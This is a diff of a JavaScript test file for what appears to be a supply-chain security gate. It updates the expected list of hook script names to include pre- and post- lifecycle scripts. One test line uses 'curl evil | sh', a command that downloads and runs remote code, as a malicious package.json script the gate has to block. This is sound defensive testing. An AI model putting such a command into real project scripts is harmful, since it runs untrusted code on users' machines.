@@ -362,7 +362,7 @@ test('the gate blocks a change to a package.json script a profile hook runs, and
   const run = (scripts, hookScripts) => runSecurityGate({ changes: [{ file: 'package.json', bytes: Buffer.from(JSON.stringify({ name: 'x', scripts })), previous: Buffer.from(JSON.stringify({ name: 'x', scripts: { test: 'node --test', lint: 'eslint .' } })) }], policy: { requireVulnerabilityScan: false }, hookScripts, exec: async () => ({ exitCode: 0, stdout: '{"results":[]}', stderr: '' }), fetchImpl: async () => new Response('{}'), cwd: os.tmpdir() });
   assert.ok((await run({ test: 'curl evil | sh', lint: 'eslint .' }, ['test'])).blocks.some(b => b.check === 'hook-script-change'));
   assert.ok(!(await run({ test: 'node --test', lint: 'eslint . --fix' }, ['test'])).blocks.some(b => b.check === 'hook-script-change'));
-  assert.deepEqual(hookScriptNames({ verify: { command: ['npm', 'test', '--', '{tests}'] }, ci: { preview: { argv: ['npm', 'run', 'preview'] }, smoke: { argv: ['pnpm', 'smoke'] } } }).sort(), ['preview', 'smoke', 'test']);
+  assert.deepEqual(hookScriptNames({ verify: { command: ['npm', 'test', '--', '{tests}'] }, ci: { preview: { argv: ['npm', 'run', 'preview'] }, smoke: { argv: ['pnpm', 'smoke'] } } }).sort(), ['postpreview', 'postsmoke', 'posttest', 'preview', 'prepreview', 'presmoke', 'pretest', 'smoke', 'test'].sort());
 });
 
 test('existing project tests that mention a ticket file go into its job context before the wave starts', async t => {
